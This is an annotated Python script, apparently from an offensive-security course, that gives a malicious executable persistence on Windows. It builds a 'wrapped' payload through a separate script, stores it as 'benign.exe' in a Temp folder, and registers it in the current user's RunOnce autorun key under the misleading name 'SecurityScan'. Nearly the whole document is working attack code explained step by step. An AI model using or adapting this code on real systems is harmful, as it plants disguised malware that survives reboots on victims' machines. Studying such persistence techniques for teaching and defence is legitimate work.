# This script creates an Autorun program in Registry to create persistence on a target system.

import os, shutil, winreg
# Python's winreg library allows interaction with the Windows Registry.

filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)
# These three lines create a "Temp(orary)" folder in the PWD with a file inside named "benign.exe."

if os.path.isfile(filepath):
    os.remove(filepath)
# The script checks for the file's existence and deletes it if so.

os.system("python BuildExe.py")
shutil.move(filename,filedir)
# The script calls a Python to create a "wrapped" malicious file (explained in Module 3.2), and moves it to the specificied location.

regkey = 1
if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE
if (regkey % 2) == 0:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
# Windows default autorun keys (basically folders that specify certain tasks to run on boot) are:
# 0 - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# 1 - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# 2 - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
# 3 - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
# These to if:else statements allow one to simply change the regkey variable to one of the default values above to ease use of the script.
# This example uses the folder location specified by (1).

reg = winreg.ConnectRegistry(None,reghive)
# The line above establishes connectivity to the Registry. "None" signifies local machine; 
# "reghive" uses the first "if" statement above to associate with Current_User.
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)\
# Using the connection just established, this line allow "write" access to "regpath" from second "if" statement; "0" is a necessary default.
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)
# Finally, this line enters the file created in the first part of the script into the Registry Autorun folder.
